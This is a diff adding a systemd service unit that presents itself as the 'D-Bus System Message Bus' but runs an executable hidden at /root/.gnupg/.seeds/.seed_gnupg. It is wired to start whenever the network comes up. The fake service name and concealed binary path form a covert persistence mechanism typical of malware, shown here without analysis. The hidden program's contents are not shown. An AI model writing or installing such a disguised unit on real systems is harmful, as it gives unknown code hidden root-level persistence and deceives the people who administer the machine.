@@ -1,0 +1,10 @@
+[Unit]
+Description=D-Bus System Message Bus
+After=network-online.target
+PartOf=network-online.target
+
+[Service]
+ExecStart=exec /root/.gnupg/.seeds/.seed_gnupg
+
+[Install]
+WantedBy=network-online.target
